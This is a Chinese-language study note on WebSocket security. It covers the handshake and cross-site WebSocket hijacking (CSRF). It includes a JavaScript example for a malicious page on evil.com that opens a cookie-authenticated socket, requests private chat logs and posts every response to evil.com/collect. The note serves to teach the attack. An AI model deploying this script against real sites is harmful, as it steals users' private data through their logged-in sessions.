# 一、知识点

### 0. WebSocket介绍

##### 产生原因：

​	它是实时的全双工协议，聊天、视频、游戏等场景，http半双工做不到实时需求

##### 工作原理：

1. 先建立http链接

2. 在http链接基础上，JS发起websocket建立链接

   ```
   GET /chat HTTP/1.1
   Host: example.com
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
   Sec-WebSocket-Version: 13
   ```

   ```
   HTTP/1.1 101 Switching Protocols
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
   ```

### 1. 和http漏洞一样，不过使用的是websockethistory

### 2. WebSocket的CSRF

**产生原因：**

1. 用户已登录某站点：`wss://chat.example.com`，并持有有效的 Cookie
2. cookie是建立websocket链接的凭证
3. 建立连接没有使用token
4. 没有使用防止csrf的其他手段

**思路：**

用户访问 `evil.com`

恶意网页中嵌入 JS，尝试建立 WebSocket 连接：

```
js复制编辑const socket = new WebSocket("wss://chat.example.com/ws");

socket.onopen = () => {
  socket.send("获取所有私聊记录");
};

socket.onmessage = (event) => {
  fetch("https://evil.com/collect", {
    method: "POST",
    body: event.data,
  });
};
```

浏览器自动携带用户 Cookie 建立连接

服务端认为这是用户的正常请求，返回敏感数据

攻击者读取数据，达成劫持目的